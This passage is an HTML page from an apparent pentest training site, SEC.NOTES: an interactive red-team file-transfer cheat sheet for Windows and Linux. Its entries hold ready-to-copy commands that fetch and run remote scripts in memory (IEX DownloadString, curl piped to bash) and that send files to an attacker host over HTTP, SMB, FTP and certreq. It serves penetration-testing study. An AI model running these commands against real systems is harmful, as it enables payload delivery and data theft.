@@ -1,0 +1,1787 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>File Transfer — SEC.NOTES</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&display=swap');
+
+:root {
+  --bg: #04060d;
+  --bg2: #080c16;
+  --bg3: #0c1220;
+  --border: #141e30;
+  --border2: #1e2d45;
+  --cyan: #00e5ff;
+  --purple: #a78bfa;
+  --red: #f43f5e;
+  --green: #10b981;
+  --amber: #f59e0b;
+  --pink: #ff79c6;
+  --text: #b8c8dc;
+  --text-dim: #3a4a60;
+  --text-mid: #5a7090;
+  --text-bright: #e8f2ff;
+}
+
+*{box-sizing:border-box;margin:0;padding:0;}
+
+body {
+  font-family:'JetBrains Mono',monospace;
+  background:var(--bg);
+  color:var(--text);
+  min-height:100vh;
+  overflow-x:hidden;
+}
+
+/* GRID BG */
+body::before {
+  content:'';
+  position:fixed;
+  inset:0;
+  background-image:
+    linear-gradient(rgba(0,229,255,0.025) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(0,229,255,0.025) 1px,transparent 1px);
+  background-size:48px 48px;
+  pointer-events:none;
+  z-index:0;
+}
+
+/* NAV */
+nav {
+  position:sticky;
+  top:0;
+  z-index:100;
+  background:rgba(4,6,13,0.92);
+  backdrop-filter:blur(16px);
+  border-bottom:1px solid var(--border);
+  padding:12px 24px;
+  display:flex;
+  align-items:center;
+  gap:16px;
+  flex-wrap:wrap;
+}
+
+.nav-logo {
+  font-family:'Syne',sans-serif;
+  font-weight:800;
+  font-size:16px;
+  color:var(--cyan);
+  letter-spacing:-0.5px;
+  text-decoration:none;
+  white-space:nowrap;
+}
+.nav-logo span{color:var(--red);}
+
+.nav-sep {
+  color:var(--text-dim);
+  font-size:14px;
+}
+
+.nav-title {
+  font-family:'Syne',sans-serif;
+  font-size:14px;
+  font-weight:700;
+  color:var(--amber);
+}
+
+.nav-spacer{flex:1;}
+
+.nav-back {
+  font-size:11px;
+  color:var(--text-dim);
+  text-decoration:none;
+  border:1px solid var(--border);
+  padding:5px 12px;
+  border-radius:20px;
+  transition:all 0.2s;
+}
+.nav-back:hover{color:var(--text);border-color:var(--border2);}
+
+/* HERO */
+.hero {
+  position:relative;
+  z-index:1;
+  text-align:center;
+  padding:48px 24px 32px;
+  max-width:900px;
+  margin:0 auto;
+}
+
+.hero-eyebrow {
+  font-size:10px;
+  text-transform:uppercase;
+  letter-spacing:3px;
+  color:var(--text-dim);
+  margin-bottom:16px;
+}
+
+.hero h1 {
+  font-family:'Syne',sans-serif;
+  font-size:clamp(28px,5vw,48px);
+  font-weight:800;
+  color:var(--text-bright);
+  letter-spacing:-2px;
+  line-height:1.1;
+  margin-bottom:12px;
+}
+
+.hero h1 em {color:var(--amber);font-style:normal;}
+
+.hero-sub {
+  font-size:12px;
+  color:var(--text-dim);
+  line-height:1.8;
+  margin-bottom:32px;
+}
+
+/* CONFIG BAR */
+.config-bar {
+  position:relative;
+  z-index:1;
+  max-width:900px;
+  margin:0 auto 32px;
+  padding:0 24px;
+}
+
+.config-inner {
+  background:var(--bg2);
+  border:1px solid var(--border2);
+  border-radius:12px;
+  padding:20px;
+  display:flex;
+  gap:12px;
+  flex-wrap:wrap;
+  align-items:flex-end;
+}
+
+.config-field {
+  display:flex;
+  flex-direction:column;
+  gap:6px;
+  flex:1;
+  min-width:140px;
+}
+
+.config-field label {
+  font-size:9px;
+  text-transform:uppercase;
+  letter-spacing:2px;
+  color:var(--amber);
+  font-weight:700;
+}
+
+.config-field input {
+  background:var(--bg3);
+  border:1px solid var(--border);
+  border-radius:8px;
+  padding:8px 12px;
+  color:var(--text-bright);
+  font-family:'JetBrains Mono',monospace;
+  font-size:13px;
+  outline:none;
+  transition:border-color 0.2s;
+  width:100%;
+}
+
+.config-field input:focus {
+  border-color:var(--amber);
+  box-shadow:0 0 0 3px rgba(245,158,11,0.08);
+}
+
+.config-field input::placeholder {color:var(--text-dim);}
+
+.search-field {
+  flex:2;
+  min-width:200px;
+}
+
+.search-field input {
+  border-color:var(--border);
+}
+.search-field input:focus {
+  border-color:var(--cyan);
+  box-shadow:0 0 0 3px rgba(0,229,255,0.06);
+}
+
+/* MAIN LAYOUT */
+.main {
+  position:relative;
+  z-index:1;
+  max-width:900px;
+  margin:0 auto;
+  padding:0 24px 80px;
+}
+
+/* TABS */
+.tabs {
+  display:flex;
+  gap:4px;
+  margin-bottom:8px;
+  flex-wrap:wrap;
+}
+
+.tab {
+  padding:6px 14px;
+  border-radius:8px;
+  font-size:11px;
+  font-weight:700;
+  letter-spacing:0.5px;
+  cursor:pointer;
+  border:1px solid var(--border);
+  background:transparent;
+  color:var(--text-dim);
+  transition:all 0.2s;
+  font-family:'JetBrains Mono',monospace;
+}
+
+.tab:hover{color:var(--text);border-color:var(--border2);}
+
+.tab.active[data-platform="all"]     {background:rgba(184,200,220,0.08);color:var(--text-bright);border-color:rgba(184,200,220,0.2);}
+.tab.active[data-platform="windows"] {background:rgba(0,229,255,0.08);color:var(--cyan);border-color:rgba(0,229,255,0.25);}
+.tab.active[data-platform="linux"]   {background:rgba(16,185,129,0.08);color:var(--green);border-color:rgba(16,185,129,0.25);}
+.tab.active[data-platform="code"]    {background:rgba(167,139,250,0.08);color:var(--purple);border-color:rgba(167,139,250,0.25);}
+.tab.active[data-platform="lotl"]    {background:rgba(245,158,11,0.08);color:var(--amber);border-color:rgba(245,158,11,0.25);}
+.tab.active[data-platform="server"]  {background:rgba(244,63,94,0.08);color:var(--red);border-color:rgba(244,63,94,0.25);}
+
+/* DIRECTION PILLS */
+.dir-row {
+  display:flex;
+  gap:6px;
+  margin-bottom:24px;
+  align-items:center;
+}
+
+.dir-pill {
+  padding:4px 12px;
+  border-radius:20px;
+  font-size:10px;
+  font-weight:700;
+  letter-spacing:0.5px;
+  cursor:pointer;
+  border:1px solid var(--border);
+  background:transparent;
+  color:var(--text-dim);
+  transition:all 0.2s;
+  font-family:'JetBrains Mono',monospace;
+}
+
+.dir-pill:hover{color:var(--text);}
+.dir-pill.active {background:rgba(0,229,255,0.08);color:var(--cyan);border-color:rgba(0,229,255,0.25);}
+
+.count-badge {
+  margin-left:auto;
+  font-size:10px;
+  color:var(--text-dim);
+}
+
+/* TECHNIQUES GRID */
+.techniques {
+  display:flex;
+  flex-direction:column;
+  gap:12px;
+}
+
+/* CARD */
+.card {
+  background:var(--bg2);
+  border:1px solid var(--border);
+  border-radius:12px;
+  overflow:hidden;
+  transition:border-color 0.2s,box-shadow 0.2s;
+}
+
+.card:hover {box-shadow:0 4px 20px rgba(0,0,0,0.3);}
+
+.card[data-platform="windows"]:hover {border-color:rgba(0,229,255,0.2);}
+.card[data-platform="linux"]:hover   {border-color:rgba(16,185,129,0.2);}
+.card[data-platform="code"]:hover    {border-color:rgba(167,139,250,0.2);}
+.card[data-platform="lotl"]:hover    {border-color:rgba(245,158,11,0.2);}
+.card[data-platform="server"]:hover  {border-color:rgba(244,63,94,0.2);}
+
+.card-head {
+  display:flex;
+  align-items:center;
+  gap:10px;
+  padding:14px 18px;
+  cursor:pointer;
+  user-select:none;
+}
+
+.platform-dot {
+  width:8px;height:8px;border-radius:50%;flex-shrink:0;
+}
+.card[data-platform="windows"] .platform-dot {background:var(--cyan);}
+.card[data-platform="linux"]   .platform-dot {background:var(--green);}
+.card[data-platform="code"]    .platform-dot {background:var(--purple);}
+.card[data-platform="lotl"]    .platform-dot {background:var(--amber);}
+.card[data-platform="server"]  .platform-dot {background:var(--red);}
+
+.card-name {
+  font-family:'Syne',sans-serif;
+  font-size:14px;
+  font-weight:700;
+  color:var(--text-bright);
+  flex:1;
+}
+
+.badge {
+  font-size:9px;
+  font-weight:700;
+  padding:2px 8px;
+  border-radius:4px;
+  letter-spacing:0.5px;
+  text-transform:uppercase;
+  white-space:nowrap;
+}
+
+.badge-proto {background:rgba(255,255,255,0.05);color:var(--text-mid);border:1px solid var(--border2);}
+
+.badge-dir-dl {background:rgba(0,229,255,0.08);color:var(--cyan);border:1px solid rgba(0,229,255,0.2);}
+.badge-dir-ul {background:rgba(16,185,129,0.08);color:var(--green);border:1px solid rgba(16,185,129,0.2);}
+.badge-dir-both {background:rgba(245,158,11,0.08);color:var(--amber);border:1px solid rgba(245,158,11,0.2);}
+.badge-dir-exec {background:rgba(244,63,94,0.08);color:var(--red);border:1px solid rgba(244,63,94,0.2);}
+
+.stealth-indicator {
+  display:flex;align-items:center;gap:4px;
+  font-size:9px;letter-spacing:0.5px;
+  white-space:nowrap;
+}
+.stealth-dot {width:6px;height:6px;border-radius:50%;}
+.stealth-high   .stealth-dot{background:var(--green);}
+.stealth-medium .stealth-dot{background:var(--amber);}
+.stealth-low    .stealth-dot{background:var(--red);}
+.stealth-high   {color:var(--green);}
+.stealth-medium {color:var(--amber);}
+.stealth-low    {color:var(--red);}
+
+.chevron {
+  color:var(--text-dim);
+  font-size:12px;
+  transition:transform 0.2s;
+  margin-left:4px;
+}
+
+.card.open .chevron {transform:rotate(180deg);}
+
+/* CARD BODY */
+.card-body {
+  display:none;
+  border-top:1px solid var(--border);
+}
+
+.card.open .card-body {display:block;}
+
+.card-notes {
+  padding:10px 18px;
+  font-size:11px;
+  color:var(--text-mid);
+  background:rgba(255,255,255,0.015);
+  border-bottom:1px solid var(--border);
+  line-height:1.6;
+}
+
+.cmd-sections {
+  padding:16px 18px;
+  display:flex;
+  flex-direction:column;
+  gap:12px;
+}
+
+.cmd-block {
+  display:flex;
+  flex-direction:column;
+  gap:6px;
+}
+
+.cmd-label {
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  gap:8px;
+}
+
+.cmd-label-text {
+  font-size:9px;
+  text-transform:uppercase;
+  letter-spacing:1.5px;
+  font-weight:700;
+}
+
+.attacker-label .cmd-label-text {color:var(--red);}
+.target-label   .cmd-label-text {color:var(--cyan);}
+
+.copy-btn {
+  background:rgba(255,255,255,0.04);
+  border:1px solid var(--border);
+  border-radius:6px;
+  color:var(--text-dim);
+  font-family:'JetBrains Mono',monospace;
+  font-size:9px;
+  font-weight:700;
+  letter-spacing:0.5px;
+  padding:3px 10px;
+  cursor:pointer;
+  transition:all 0.2s;
+  display:flex;
+  align-items:center;
+  gap:5px;
+}
+.copy-btn:hover{background:rgba(255,255,255,0.08);color:var(--text);border-color:var(--border2);}
+.copy-btn.copied{color:var(--green);border-color:rgba(16,185,129,0.3);}
+
+pre.cmd {
+  background:var(--bg3);
+  border:1px solid var(--border);
+  border-radius:8px;
+  padding:12px 14px;
+  font-size:12px;
+  line-height:1.7;
+  overflow-x:auto;
+  white-space:pre;
+  color:var(--text);
+}
+
+pre.cmd .c {color:var(--text-dim);}          /* comments */
+pre.cmd .h {color:var(--amber);font-weight:700;} /* LHOST */
+pre.cmd .p {color:var(--green);font-weight:700;} /* LPORT */
+pre.cmd .kw{color:var(--cyan);}               /* keywords */
+pre.cmd .str{color:var(--purple);}            /* strings */
+
+/* EMPTY STATE */
+.empty {
+  text-align:center;
+  padding:48px;
+  color:var(--text-dim);
+  font-size:13px;
+}
+
+/* SECTION HEADER */
+.section-header {
+  font-size:9px;
+  text-transform:uppercase;
+  letter-spacing:2px;
+  color:var(--text-dim);
+  padding:8px 0 4px;
+  border-bottom:1px solid var(--border);
+  margin-bottom:8px;
+  font-weight:700;
+}
+
+/* HIDDEN */
+.card.hidden{display:none;}
+
+/* SCROLLBAR */
+::-webkit-scrollbar{width:6px;height:6px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px;}
+::-webkit-scrollbar-thumb:hover{background:var(--text-dim);}
+
+/* TAGS */
+.card-tags {
+  display:flex;gap:4px;flex-wrap:wrap;margin-top:6px;
+}
+.tag {
+  font-size:8px;padding:1px 6px;border-radius:3px;
+  background:rgba(255,255,255,0.04);
+  color:var(--text-dim);
+  border:1px solid var(--border);
+  letter-spacing:0.3px;
+}
+
+@media(max-width:600px){
+  .config-inner{flex-direction:column;}
+  .hero h1{font-size:28px;}
+  .card-head{flex-wrap:wrap;}
+  nav{padding:10px 16px;}
+}
+</style>
+</head>
+<body>
+
+<nav>
+  <a href="../" class="nav-logo">SEC<span>.</span>NOTES</a>
+  <span class="nav-sep">/</span>
+  <span class="nav-title">File Transfer</span>
+  <div class="nav-spacer"></div>
+  <a href="../" class="nav-back">← Back</a>
+</nav>
+
+<div class="hero">
+  <p class="hero-eyebrow">Penetration Testing · Red Team · CPTS</p>
+  <h1>File Transfer <em>Cheat Sheet</em></h1>
+  <p class="hero-sub">Interactive reference for file transfer techniques — Windows, Linux, Code, LOLBins, and Server Setup.<br>Enter your IP and port below — all commands update instantly.</p>
+</div>
+
+<div class="config-bar">
+  <div class="config-inner">
+    <div class="config-field">
+      <label>Attacker IP (LHOST)</label>
+      <input id="lhost" type="text" placeholder="10.10.14.5" value="10.10.14.5" autocomplete="off" spellcheck="false">
+    </div>
+    <div class="config-field">
+      <label>Port (LPORT)</label>
+      <input id="lport" type="text" placeholder="8000" value="8000" autocomplete="off" spellcheck="false">
+    </div>
+    <div class="config-field search-field">
+      <label>Search</label>
+      <input id="search" type="text" placeholder="certutil, scp, smb, curl..." autocomplete="off" spellcheck="false">
+    </div>
+  </div>
+</div>
+
+<div class="main">
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-platform="all">All</button>
+    <button class="tab" data-platform="windows">⊞ Windows</button>
+    <button class="tab" data-platform="linux">🐧 Linux</button>
+    <button class="tab" data-platform="code">{ } Code</button>
+    <button class="tab" data-platform="lotl">🌿 LOLBins</button>
+    <button class="tab" data-platform="server">⚡ Server Setup</button>
+  </div>
+
+  <div class="dir-row">
+    <button class="dir-pill active" data-dir="all">All</button>
+    <button class="dir-pill" data-dir="download">⬇ Download</button>
+    <button class="dir-pill" data-dir="upload">⬆ Upload</button>
+    <button class="dir-pill" data-dir="execute">⚡ Execute</button>
+    <span class="count-badge" id="count-badge">49 techniques</span>
+  </div>
+
+  <div class="techniques" id="techniques-list"></div>
+</div>
+
+<script>
+const TECHNIQUES = [
+
+// ─────────────────────────────────────────────────────────────
+// WINDOWS — DOWNLOAD
+// ─────────────────────────────────────────────────────────────
+{
+  id:'win-ps-base64-dl',
+  name:'PS — Base64 Paste (no network)',
+  platform:'windows',
+  direction:'download',
+  proto:'No Network',
+  tags:['powershell','base64','clipboard','fileless','webshell'],
+  stealth:'medium',
+  notes:'No network required. Ideal for small files via clipboard, RDP paste, or web shells.',
+  attacker:
+`# Encode file on attacker
+cat /path/to/file.exe | base64 -w0; echo
+
+# Verify
+md5sum /path/to/file.exe`,
+  target:
+`# Paste base64 string, decode to file
+[IO.File]::WriteAllBytes("C:\\Users\\Public\\file.exe",
+    [Convert]::FromBase64String("BASE64_STRING_HERE"))
+
+# Verify integrity
+Get-FileHash "C:\\Users\\Public\\file.exe" -Algorithm MD5`
+},
+
+{
+  id:'win-webclient-dl',
+  name:'PS — WebClient.DownloadFile',
+  platform:'windows',
+  direction:'download',
+  proto:'HTTP/S',
+  tags:['powershell','http','webclient'],
+  stealth:'low',
+  notes:'Classic download. Works on PowerShell 2+. If it fails try -UseBasicParsing or disable cert check.',
+  attacker:
+`# Start HTTP server
+python3 -m http.server LPORT`,
+  target:
+`# Download to disk
+(New-Object Net.WebClient).DownloadFile(
+  'http://LHOST:LPORT/file.exe',
+  'C:\\Users\\Public\\file.exe'
+)`
+},
+
+{
+  id:'win-iwr-dl',
+  name:'PS — Invoke-WebRequest',
+  platform:'windows',
+  direction:'download',
+  proto:'HTTP/S',
+  tags:['powershell','http','iwr','invoke-webrequest'],
+  stealth:'low',
+  notes:'PowerShell 3+. Use -UseBasicParsing if you get IE DOM errors. Supports -OutFile and custom -UserAgent.',
+  attacker:
+`# Start HTTP server
+python3 -m http.server LPORT`,
+  target:
+`# Download to file
+Invoke-WebRequest -Uri 'http://LHOST:LPORT/file.exe' -OutFile 'C:\\Users\\Public\\file.exe'
+
+# With Chrome UA (bypasses naive UA blocks)
+Invoke-WebRequest -Uri 'http://LHOST:LPORT/file.exe' \`
+  -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome \`
+  -OutFile 'C:\\Users\\Public\\file.exe'`
+},
+
+{
+  id:'win-iex-fileless',
+  name:'PS — IEX Fileless Execution',
+  platform:'windows',
+  direction:'execute',
+  proto:'HTTP/S',
+  tags:['powershell','http','iex','fileless','in-memory'],
+  stealth:'medium',
+  notes:'Executes script in memory — no file written to disk. Still visible to ETW/ScriptBlockLogging.',
+  attacker:
+`# Host script
+python3 -m http.server LPORT`,
+  target:
+`# Load + execute in memory (no file on disk)
+IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/Invoke-Tool.ps1')
+
+# Alt: pipe
+(New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/Invoke-Tool.ps1') | IEX
+
+# With bypass
+powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden \`
+  -Command "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/Invoke-Tool.ps1')"`
+},
+
+{
+  id:'win-smb-dl',
+  name:'Windows — SMB Pull (impacket)',
+  platform:'windows',
+  direction:'download',
+  proto:'SMB / TCP 445',
+  tags:['smb','impacket','445','network-share'],
+  stealth:'medium',
+  notes:'Works when SMB outbound is allowed. Modern Windows blocks unauthenticated guest access — use credentials.',
+  attacker:
+`# SMB server (no auth)
+sudo impacket-smbserver share -smb2support /tmp/share
+
+# SMB server (with auth — needed on modern Windows)
+sudo impacket-smbserver share -smb2support /tmp/share \
+  -user s2k7x -password 'P@ss123'`,
+  target:
+`# Copy directly
+copy \\\\LHOST\\share\\file.exe C:\\Users\\Public\\file.exe
+
+# Map drive with creds, then copy
+net use n: \\\\LHOST\\share /user:s2k7x P@ss123
+copy n:\\file.exe C:\\Users\\Public\\file.exe`
+},
+
+{
+  id:'win-ftp-dl',
+  name:'Windows — FTP Download',
+  platform:'windows',
+  direction:'download',
+  proto:'FTP / TCP 21',
+  tags:['ftp','21','pyftpdlib','non-interactive'],
+  stealth:'low',
+  notes:'FTP is often filtered. Use non-interactive script if stdin is unavailable (reverse shell).',
+  attacker:
+`# Anonymous FTP server on attacker
+sudo python3 -m pyftpdlib --port 21`,
+  target:
+`# PowerShell download
+(New-Object Net.WebClient).DownloadFile('ftp://LHOST/file.exe','C:\\Users\\Public\\file.exe')
+
+# Non-interactive batch FTP
+echo open LHOST 21 > ftp.txt
+echo USER anonymous >> ftp.txt
+echo binary >> ftp.txt
+echo GET file.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -v -n -s:ftp.txt`
+},
+
+{
+  id:'win-webdav-dl',
+  name:'Windows — WebDAV Pull',
+  platform:'windows',
+  direction:'download',
+  proto:'HTTP / TCP 80',
+  tags:['webdav','http','wsgidav','no-smb'],
+  stealth:'high',
+  notes:'Works when SMB is blocked. Accessed via UNC path. Traffic blends with normal HTTP.',
+  attacker:
+`# Install + start WebDAV server
+pip3 install wsgidav cheroot
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp/share --auth=anonymous`,
+  target:
+`# Browse and copy — Windows auto-mounts via DavWWWRoot
+dir \\\\LHOST\\DavWWWRoot
+copy \\\\LHOST\\DavWWWRoot\\file.exe C:\\Users\\Public\\file.exe`
+},
+
+{
+  id:'win-certutil-dl',
+  name:'Windows — certutil (LOLBAS)',
+  platform:'windows',
+  direction:'download',
+  proto:'HTTP/S',
+  tags:['certutil','lolbas','living-off-the-land','builtin'],
+  stealth:'low',
+  notes:'Built-in Windows binary. Very commonly used. AMSI and EDRs flag certutil downloads.',
+  attacker:
+`# Start HTTP server
+python3 -m http.server LPORT`,
+  target:
+`# Download file
+certutil.exe -urlcache -split -f http://LHOST:LPORT/file.exe C:\\Users\\Public\\file.exe
+
+# Alternative
+certutil.exe -verifyctl -split -f http://LHOST:LPORT/file.exe`
+},
+
+{
+  id:'win-bits-dl',
+  name:'Windows — BITS / bitsadmin',
+  platform:'windows',
+  direction:'download',
+  proto:'HTTP/S / SMB',
+  tags:['bits','bitsadmin','bitstransfer','lolbas','windows-builtin'],
+  stealth:'medium',
+  notes:'Background Intelligent Transfer Service. Lower noise than Invoke-WebRequest for large files.',
+  attacker:
+`# Start HTTP server
+python3 -m http.server LPORT`,
+  target:
+`# bitsadmin (legacy — works on older systems)
+bitsadmin /transfer job /priority foreground http://LHOST:LPORT/file.exe C:\\Users\\Public\\file.exe
+
+# PowerShell BITS (preferred)
+Import-Module bitstransfer
+Start-BitsTransfer -Source "http://LHOST:LPORT/file.exe" -Destination "C:\\Users\\Public\\file.exe"`
+},
+
+{
+  id:'win-vbs-dl',
+  name:'Windows — VBScript wget',
+  platform:'windows',
+  direction:'download',
+  proto:'HTTP/S',
+  tags:['vbscript','cscript','com','windows-builtin'],
+  stealth:'medium',
+  notes:'Uses XMLHTTP + ADODB. No PowerShell needed — good for cmd-only environments.',
+  attacker:
+`# Start HTTP server
+python3 -m http.server LPORT`,
+  target:
+`# Write wget.vbs
+echo dim xHttp: Set xHttp=createobject("Microsoft.XMLHTTP") > wget.vbs
+echo dim bStrm: Set bStrm=createobject("Adodb.Stream") >> wget.vbs
+echo xHttp.Open "GET", WScript.Arguments.Item(0), False >> wget.vbs
+echo xHttp.Send >> wget.vbs
+echo with bStrm >> wget.vbs
+echo   .type=1 >> wget.vbs
+echo   .open >> wget.vbs
+echo   .write xHttp.responseBody >> wget.vbs
+echo   .savetofile WScript.Arguments.Item(1),2 >> wget.vbs
+echo end with >> wget.vbs
+
+# Download
+cscript.exe /nologo wget.vbs http://LHOST:LPORT/file.exe file.exe`
+},
+
+{
+  id:'win-js-dl',
+  name:'Windows — JavaScript wget (cscript)',
+  platform:'windows',
+  direction:'download',
+  proto:'HTTP/S',
+  tags:['javascript','jscript','cscript','activex','windows-builtin'],
+  stealth:'medium',
+  notes:'WinHTTP via ActiveX. Similar to VBScript but JS syntax. No PowerShell required.',
+  attacker:
+`# Start HTTP server
+python3 -m http.server LPORT`,
+  target:
+`# Write wget.js
+echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); > wget.js
+echo WinHttpReq.Open("GET", WScript.Arguments(0), false); >> wget.js
+echo WinHttpReq.Send(); >> wget.js
+echo BinStream = new ActiveXObject("ADODB.Stream"); >> wget.js
+echo BinStream.Type = 1; >> wget.js
+echo BinStream.Open(); >> wget.js
+echo BinStream.Write(WinHttpReq.ResponseBody); >> wget.js
+echo BinStream.SaveToFile(WScript.Arguments(1)); >> wget.js
+
+# Download
+cscript.exe /nologo wget.js http://LHOST:LPORT/file.exe file.exe`
+},
+
+{
+  id:'win-winrm-dl',
+  name:'Windows — WinRM / PSRemoting Copy',
+  platform:'windows',
+  direction:'download',
+  proto:'WinRM / TCP 5985',
+  tags:['winrm','psremoting','copy-item','lateral-movement'],
+  stealth:'high',
+  notes:'Lateral file transfer between Windows machines. Requires admin or Remote Management Users.',
+  target:
+`# Test connectivity
+Test-NetConnection -ComputerName TARGET -Port 5985
+
+# Create session
+$s = New-PSSession -ComputerName TARGET
+
+# Download from remote to local
+Copy-Item -Path "C:\\Users\\Admin\\Desktop\\file.txt" \`
+  -FromSession $s -Destination C:\\
+
+# Upload local to remote
+Copy-Item -Path C:\\file.txt \`
+  -ToSession $s -Destination "C:\\Users\\Admin\\Desktop\\"`
+},
+
+// ─────────────────────────────────────────────────────────────
+// WINDOWS — UPLOAD
+// ─────────────────────────────────────────────────────────────
+{
+  id:'win-ps-base64-ul',
+  name:'PS — Base64 Encode & Exfil',
+  platform:'windows',
+  direction:'upload',
+  proto:'No Network',
+  tags:['powershell','base64','exfiltration','clipboard'],
+  stealth:'medium',
+  notes:'Encode a file to base64 for copy-paste exfil. Verify hash on both ends.',
+  target:
+`# Encode file to base64
+$b64 = [Convert]::ToBase64String(
+    [IO.File]::ReadAllBytes("C:\\Windows\\System32\\drivers\\etc\\hosts"))
+Write-Output $b64
+# Copy the output and decode on attacker
+
+# Verify hash
+Get-FileHash "C:\\Windows\\System32\\drivers\\etc\\hosts" -Algorithm MD5`,
+  attacker:
+`# Decode on attacker
+echo "BASE64_STRING_HERE" | base64 -d > hosts
+md5sum hosts`
+},
+
+{
+  id:'win-uploadserver-ul',
+  name:'PS — HTTP Upload (uploadserver)',
+  platform:'windows',
+  direction:'upload',
+  proto:'HTTP',
+  tags:['powershell','http','upload','uploadserver','psu'],
+  stealth:'low',
+  notes:'Uses a simple Python upload server. Works with PSUpload.ps1 helper or raw POST.',
+  attacker:
+`# Install + start
+pip3 install uploadserver
+python3 -m uploadserver LPORT`,
+  target:
+`# Method 1: PSUpload helper
+IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/PSUpload.ps1')
+Invoke-FileUpload -Uri http://LHOST:LPORT/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts
+
+# Method 2: Raw base64 POST via nc listener
+$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\\path\\to\\file"))
+Invoke-WebRequest -Uri http://LHOST:LPORT -Method POST -Body $b64`
+},
+
+{
+  id:'win-smb-ul',
+  name:'Windows — SMB Upload to Share',
+  platform:'windows',
+  direction:'upload',
+  proto:'SMB / TCP 445',
+  tags:['smb','impacket','exfiltration','445'],
+  stealth:'medium',
+  notes:'Copy files to an attacker-controlled SMB share. Enable write on impacket-smbserver.',
+  attacker:
+`# SMB server with auth (required for upload on modern Windows)
+sudo impacket-smbserver share -smb2support /tmp/exfil \
+  -user s2k7x -password 'P@ss123'`,
+  target:
+`# Map drive and copy
+net use n: \\\\LHOST\\share /user:s2k7x P@ss123
+copy C:\\sensitive\\file.zip n:\\file.zip`
+},
+
+{
+  id:'win-ftp-ul',
+  name:'Windows — FTP Upload',
+  platform:'windows',
+  direction:'upload',
+  proto:'FTP / TCP 21',
+  tags:['ftp','pyftpdlib','upload','exfiltration'],
+  stealth:'low',
+  notes:'FTP upload via WebClient or batch script. Enable --write on pyftpdlib.',
+  attacker:
+`# FTP server with write access
+sudo python3 -m pyftpdlib --port 21 --write`,
+  target:
+`# PowerShell upload
+(New-Object Net.WebClient).UploadFile('ftp://LHOST/hosts','C:\\Windows\\System32\\drivers\\etc\\hosts')
+
+# Batch FTP
+echo open LHOST 21 > ftp.txt
+echo USER anonymous >> ftp.txt
+echo binary >> ftp.txt
+echo PUT C:\\Windows\\System32\\drivers\\etc\\hosts >> ftp.txt
+echo bye >> ftp.txt
+ftp -v -n -s:ftp.txt`
+},
+
+{
+  id:'win-certreq-ul',
+  name:'Windows — certreq.exe POST (LOLBAS)',
+  platform:'windows',
+  direction:'upload',
+  proto:'HTTP',
+  tags:['certreq','lolbas','upload','living-off-the-land'],
+  stealth:'medium',
+  notes:'Built-in certreq.exe can POST data to an HTTP listener. Useful for exfil when other methods blocked.',
+  attacker:
+`# Listen with netcat
+sudo nc -lvnp LPORT`,
+  target:
+`# POST file contents to attacker listener
+certreq.exe -Post -config http://LHOST:LPORT/ C:\\Windows\\win.ini`
+},
+
+// ─────────────────────────────────────────────────────────────
+// LINUX — DOWNLOAD
+// ─────────────────────────────────────────────────────────────
+{
+  id:'lin-wget-dl',
+  name:'Linux — wget',
+  platform:'linux',
+  direction:'download',
+  proto:'HTTP/S',
+  tags:['wget','http','linux','download'],
+  stealth:'low',
+  notes:'Most common download tool on Linux. Available on almost all distros.',
+  attacker:
+`# Start HTTP server
+python3 -m http.server LPORT`,
+  target:
+`# Download to file
+wget http://LHOST:LPORT/linpeas.sh -O /tmp/linpeas.sh
+
+# Quiet output
+wget -q http://LHOST:LPORT/linpeas.sh -O /tmp/linpeas.sh`
+},
+
+{
+  id:'lin-curl-dl',
+  name:'Linux — curl',
+  platform:'linux',
+  direction:'download',
+  proto:'HTTP/S',
+  tags:['curl','http','linux','download'],
+  stealth:'low',
+  notes:'Versatile download tool. Use -k to ignore SSL errors. More flexible than wget.',
+  attacker:
+`# Start HTTP server
+python3 -m http.server LPORT`,
+  target:
+`# Download to file
+curl -o /tmp/linpeas.sh http://LHOST:LPORT/linpeas.sh
+
+# Download + save with remote name
+curl -O http://LHOST:LPORT/linpeas.sh
+
+# Ignore TLS errors
+curl -k -o /tmp/file https://LHOST:LPORT/file`
+},
+
+{
+  id:'lin-curl-fileless',
+  name:'Linux — curl/wget Fileless Execution',
+  platform:'linux',
+  direction:'execute',
+  proto:'HTTP/S',
+  tags:['curl','wget','fileless','in-memory','pipe'],
+  stealth:'medium',
+  notes:'No file written to disk. Still visible in process tree and network logs. Detected by EDR.',
+  attacker:
+`# Start HTTP server
+python3 -m http.server LPORT`,
+  target:
+`# curl pipe to bash
+curl -sSL http://LHOST:LPORT/script.sh | bash
+
+# wget pipe to bash
+wget -qO- http://LHOST:LPORT/script.sh | bash
+
+# curl pipe to python
+curl -sSL http://LHOST:LPORT/exploit.py | python3`
+},
+
+{
+  id:'lin-devtcp-dl',
+  name:'Linux — /dev/tcp (bash native)',
+  platform:'linux',
+  direction:'download',
+  proto:'TCP (raw)',
+  tags:['/dev/tcp','bash','minimal','no-tools'],
+  stealth:'high',
+  notes:'No curl/wget/python needed. Just bash. Works in highly restricted environments.',
+  attacker:
+`# Serve file with nc
+sudo nc -lvnp LPORT < /path/to/file.sh`,
+  target:
+`# Bash TCP download
+cat < /dev/tcp/LHOST/LPORT > /tmp/file.sh
+chmod +x /tmp/file.sh
+
+# Full HTTP GET via /dev/tcp
+exec 3<>/dev/tcp/LHOST/LPORT
+echo -e "GET /file.sh HTTP/1.1\\r\\nHost: LHOST\\r\\nConnection: close\\r\\n\\r\\n" >&3
